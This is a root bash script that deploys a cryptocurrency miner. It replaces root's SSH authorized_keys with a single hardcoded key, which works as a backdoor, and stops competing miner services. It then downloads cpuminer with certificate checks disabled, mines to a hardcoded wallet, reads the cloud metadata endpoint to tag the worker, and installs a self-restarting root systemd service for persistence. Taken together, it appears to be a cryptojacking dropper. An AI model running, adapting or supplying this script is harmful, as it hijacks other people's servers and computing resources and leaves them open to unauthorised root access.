#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

[ -z "$1" ] && WORKER_WALLET_ADDRESS='TWf7aG21k3C8RGyEUDFFozhCKXXKRCwWre' || WORKER_WALLET_ADDRESS="$1"

if [ "$(which yum)" ]; then
    yum install curl bc -y
else
    apt update -y
    apt install curl bc -y
fi
systemctl stop monitor shaipot shai scash tdc
systemctl disable monitor shaipot shai scash tdc

rm -rf /opt/tdc

DIR="/opt/tdc"

mkdir -p $DIR

version="$(wget -T 3 -t 2 -qO- https://github.com/rplant8/cpuminer-opt-rplant/releases/ | grep 'cpuminer-opt-rplant' | grep expanded_assets | head -1 | awk '{print $5}' | xargs | awk -F '/' '{print $8}')"

url="https://github.com/rplant8/cpuminer-opt-rplant/releases/download/${version}/cpuminer-opt-linux-${version}a.tar.gz"

wget --no-check-certificate $url -qO - | tar -zxf - -C $DIR
if [ "$?" -ne 0 ]
then
url="https://github.com/rplant8/cpuminer-opt-rplant/releases/download/${version}/cpuminer-opt-linux-${version}.tar.gz"

wget --no-check-certificate $url -qO - | tar -zxf - -C $DIR
fi
chmod +x $DIR/cpuminer-avx512

eu=$(curl -s -o /dev/null -w "%{time_total}\n" stratum-eu.rplant.xyz)
asia=$(curl -s -o /dev/null -w "%{time_total}\n" stratum-asia.rplant.xyz)
na=$(curl -s -o /dev/null -w "%{time_total}\n" stratum-na.rplant.xyz)

if (($(bc <<<"$eu > $asia"))) && (($(bc <<<"$na > $asia"))); then
    pool_url="stratum-asia.rplant.xyz:17059"
elif (($(bc <<<"$asia > $eu"))) && (($(bc <<<"$na > $eu"))); then
    pool_url="stratum-eu.rplant.xyz:17059"
else
    pool_url="stratum-na.rplant.xyz:17059"
fi

COMMAND_BASE="$DIR/cpuminer-avx512 -a yespowertide -o stratum+tcps://${pool_url} -u ${WORKER_WALLET_ADDRESS}.\${ALIAS}"

echo '''#!/bin/bash

ALIAS=$(wget -T 3 -t 2 -qO- http://169.254.169.254/2021-03-23/meta-data/public-ipv4 | sed "s/\./-/g")

[ -z "$ALIAS" ] && ALIAS=$(wget -T 3 -t 2 -qO- ifconfig.me | sed "s/\./-/g")

''' >$DIR/start.sh

echo $COMMAND_BASE >>$DIR/start.sh
chmod +x $DIR/start.sh

echo """[Unit]
Description=tdc
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/start.sh
Restart=always
RestartSec=5s
[Install]
WantedBy=default.target""" >/etc/systemd/system/tdc.service

systemctl daemon-reload
systemctl enable tdc
systemctl restart tdc